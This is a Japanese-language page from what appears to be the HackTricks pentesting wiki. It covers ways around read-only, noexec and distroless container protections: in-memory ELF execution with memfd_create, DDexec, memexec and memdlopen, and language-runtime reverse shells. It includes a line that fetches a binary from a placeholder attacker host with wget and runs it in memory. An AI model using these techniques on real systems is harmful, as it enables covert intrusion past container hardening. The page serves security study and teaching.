# FS protection の bypass: read-only / no-exec / Distroless

{{#include ../../../../banners/hacktricks-training.md}}

## 動画

以下の動画では、このページで紹介する技法について、より詳しく解説しています:<sup>[[1]](#references)[[2]](#references)</sup>

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4).<sup>[[1]](#references)</sup>
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU).<sup>[[2]](#references)</sup>

## read-only / no-exec のシナリオ

コンテナでは、security context で **`readOnlyRootFilesystem: true`** を設定することで、root filesystem を read-only としてマウントできます。<sup>[[3]](#references)</sup> 例:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
  name: alpine-pod
spec:
  containers:
  - name: alpine
    image: alpine
    securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

root が read-only でも、別途マウントされた volume が read-only になるわけではありません。Docker は **`/dev/shm`** を IPC mount として扱います。一方、`rw` や `noexec` などの tmpfs オプションは、実行時の設定によって決まります。どちらの動作も前提にする前に、対象コンテナの mount オプションを確認してください。<sup>[[4]](#references)[[5]](#references)</sup>

> [!WARNING]
> red-team の観点では、この組み合わせにより、まだ利用できないバイナリ（たとえば backdoor や enumeration tool）のダウンロードや実行が難しくなることがあります。<sup>[[4]](#references)[[5]](#references)</sup>

## 最も簡単な bypass: Scripts

`noexec` mount は、その mount 上にあるバイナリの直接実行を阻止しますが、interpreter は引き続き script を読み込んで解釈できます。そのため、`sh` または `python` があれば、shell script や Python script をその interpreter 経由で実行できます。<sup>[[5]](#references)</sup>

必要な tool 自体がバイナリの場合は、この方法は役に立ちません。<sup>[[5]](#references)</sup>

## Memory Bypasses

マウントされたパスからの直接実行がブロックされている場合、ELF をメモリに読み込み、メモリ上のパス経由で実行する方法があります。これにより、その mount に対する `noexec` チェックは回避できますが、その他の kernel、permission、policy による制御は回避できません。<sup>[[5]](#references)[[6]](#references)</sup>

### FD + exec syscall bypass

scripting runtime が関連する Linux interface にアクセスできる場合、**`memfd_create(2)`** で匿名の RAM-backed file descriptor を作成し、そこに ELF のバイト列を書き込んで、fd-backed の実行方法を使えます。[**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) プロジェクトは、この手順で使う圧縮・base64 encode 済みの Python、Perl、Ruby コードを生成します。<sup>[[6]](#references)[[7]](#references)</sup>

このプロジェクトが現在ドキュメントで扱っている対象は Python、Perl、Ruby です。PHP や Node では、runtime 固有の別の技法や拡張が必要です。そのため、ある言語向けの generator がないからといって、メモリ上で実行できないということではありません。<sup>[[6]](#references)[[12]](#references)</sup>

匿名ファイルの実行、関連する staging パターン、検知および forensic collection についての詳しい説明は、[Linux Fileless Execution](../../../post-exploitation/linux-fileless-execution.md) を参照してください。

> [!WARNING]
> **`/dev/shm`** に書き込んだ通常の実行ファイルは、その mount の **`noexec`** 設定の対象のままです。通常の file descriptor 経由で開くだけでは、mount policy は変わりません。<sup>[[5]](#references)</sup>
>
> 実際に使えるメモリ実行方法は、runtime、architecture、kernel、および利用可能な permission にも左右されます。<sup>[[6]](#references)[[7]](#references)[[12]](#references)</sup>

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) は、実行中の shell process に **`/proc/self/mem`** 経由で stager と loader を書き込み、そのコードに制御を移します。<sup>[[8]](#references)</sup>

これにより、実行可能な filesystem 上にバイナリを配置せずに、指定したバイナリを process に読み込ませることができます。<sup>[[8]](#references)</sup>

> [!TIP]
> **DDexec / EverythingExec** は、shellcode やバイナリを **memory** から読み込んで **実行** できます。<sup>[[8]](#references)</sup>

```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```

この technique の詳細については、Github または以下を確認してください。

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) は、daemon として動作する DDexec の実装です。daemon は引数とプログラムの生バイト列を含むリクエストを待ち受け、子プロセスを fork して各プログラムを読み込み、実行し、親プロセスはサーバーとして動作し続けます。<sup>[[9]](#references)</sup>

このリポジトリには、**memexec を使って PHP reverse shell からバイナリを実行する**例が [a.php](https://github.com/arget13/memexec/blob/main/a.php) に含まれています。<sup>[[9]](#references)</sup>

### Memdlopen

DDexec と同様の目的を持つ [**memdlopen**](https://github.com/arget13/memdlopen) は、shared object またはプログラム向けの fileless `dlopen()` 実装です。README には現在 ARM64 のサポートが記載されているため、使用前に対象のアーキテクチャを確認してください。<sup>[[10]](#references)</sup>

## Distroless Bypass

**distroless とは実際に何か**、どのような場合に有効で、どのような場合には有効でないか、またコンテナ内の post-exploitation の手法をどう変えるかについて、詳しくは以下を確認してください。

{{#ref}}
../../../containers-namespaces/container-security/distroless.md
{{#endref}}

### distroless とは

Distroless イメージにはアプリケーションとその runtime dependencies のみが含まれます。公式イメージには、標準的な Linux ディストリビューションにあると想定される package manager、shell、その他のプログラムは含まれていません。<sup>[[11]](#references)</sup>

runtime image をそれらの依存関係だけに絞ることで、本番環境に存在するソフトウェアと、スキャンおよび追跡が必要なソフトウェアの量を減らせます。<sup>[[11]](#references)</sup>

### Reverse Shell

distroless コンテナでは、通常の shell 用の **`sh` や `bash`** が見つからないことがあり、`ls`、`whoami`、`id` などの一般的な utility もない場合があります。<sup>[[11]](#references)</sup>

> [!WARNING]
> そのため、通常の shell ベースの reverse shell や utility ベースの列挙は機能しないことがあります。<sup>[[11]](#references)</sup>

侵害されたアプリケーションに言語 runtime（たとえば Flask アプリケーションの Python や Node アプリケーションの Node.js）が含まれている場合、RCE を利用して、その runtime による command channel の確立や API 経由のシステム調査が可能なことがあります。<sup>[[11]](#references)[[12]](#references)</sup>

> [!TIP]
> 利用可能な scripting language の機能を使って、**システムを列挙**してください。<sup>[[12]](#references)</sup>

**read-only/no-exec** protections がない場合、command channel から書き込み可能かつ実行可能な mount にバイナリを書き込み、実行できることがあります。まず mount options と permissions を確認してください。<sup>[[4]](#references)[[5]](#references)</sup>

> [!TIP]
> これらの protections がある場合は、runtime、kernel、permissions が許す範囲で、上記の**メモリ実行 technique**を使用してください。<sup>[[6]](#references)[[8]](#references)[[10]](#references)</sup>

RCE の脆弱性を悪用して scripting language の **reverse shell** を取得し、メモリからバイナリを実行する**例**は、[**DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE) にあります。<sup>[[12]](#references)</sup>

## References

- [1] [DEF CON 31 - ステルスと回避のための Linux メモリ操作を探る](https://www.youtube.com/watch?v=poHirez8jk4)
- [2] [DDexec-ng とメモリ内 dlopen() によるステルス侵入 - HackTricks Track 2023](https://www.youtube.com/watch?v=VM_gjjiARaU)
- [3] [Pod またはコンテナの Security Context を設定する](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [4] [docker container run](https://docs.docker.com/reference/cli/docker/container/run)
- [5] [mount(8) - Linux マニュアルページ](https://man7.org/linux/man-pages/man8/mount.8.html)
- [6] [fileless-elf-exec](https://github.com/nnsee/fileless-elf-exec)
- [7] [memfd_create(2) - Linux マニュアルページ](https://man7.org/linux/man-pages/man2/memfd_create.2.html)
- [8] [DDexec](https://github.com/arget13/DDexec)
- [9] [memexec](https://github.com/arget13/memexec)
- [10] [memdlopen](https://github.com/arget13/memdlopen)
- [11] [GoogleContainerTools/distroless](https://github.com/GoogleContainerTools/distroless)
- [12] [DistrolessRCE](https://github.com/carlospolop/DistrolessRCE)
{{#include ../../../../banners/hacktricks-training.md}}
